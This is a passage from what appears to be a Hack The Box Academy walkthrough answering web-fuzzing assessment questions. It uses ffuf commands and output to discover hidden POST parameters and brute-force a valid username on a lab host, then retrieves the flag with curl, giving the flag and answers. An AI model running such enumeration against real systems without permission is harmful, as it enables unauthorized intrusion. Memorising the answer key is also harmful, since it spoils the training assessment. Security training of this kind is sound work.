 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

password                [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 1ms]
debug                   [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 1ms]
page                    [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 2ms]
email                   [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 2ms]

<SNIP>
```

The response size for any erroneous `POST` parameter is 774, thus, students need to filter it out using the `-fs` flag:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774 -t 100
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-y2llhq5gie]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:32569/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://faculty.academy.htb:32569/courses/linux-security.php7
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=key
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 774
________________________________________________

user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 1ms]
username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 431ms]
:: Progress: [2588/2588] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

From the output of `Ffuf`, students will know that the `POST` parameters are `user` and `username`.

Answer: `user username`

# Skills Assessment - Web Fuzzing

## Question 5

### "Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?"

From the previous question, students will know that the two `POST` parameters are `user` and `username`. Therefore, students need to fuzz the valid value for the parameter `username`. First, students need to determine the response size of a request with an erroneous value for the `username` `POST` parameter, finding it to be 781:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -t 100
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-y2llhq5gie]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:31312/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://faculty.academy.htb:31312/courses/linux-security.php7
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

abbie                   [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 2ms]
aaliyah                 [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 2ms]
abahri                  [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 1ms]
abbi                    [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 3ms]
```

Thus, students need to filter it out using the `-fs` flag:

```shell
ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781 -t 100
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-y2llhq5gie]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:31312/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://faculty.academy.htb:31312/courses/linux-security.php7
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 781
________________________________________________

harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 0ms]
:: Progress: [10164/10164] :: Job [1/1] :: 215 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

From the output, students will know that the valid value for the `POST` parameter `username` is `harry`. At last, to attain the flag `HTB{w3b_fuzz1n6_m4573r}`, students need to use `cURL` with the `POST` parameter `username` and the value `harry`:

```shell
curl -s http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'username=harry' | grep "HTB{.*}"
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-y2llhq5gie]─[~]
└──╼ [★]$ curl -s http://faculty.academy.htb:31312/courses/linux-security.php7 -X POST -d 'username=harry' | grep "HTB{.*}"

<div class='center'><p>HTB{w3b_fuzz1n6_m4573r}</p></div>
```

Answer: `HTB{w3b_fuzz1n6_m4573r}`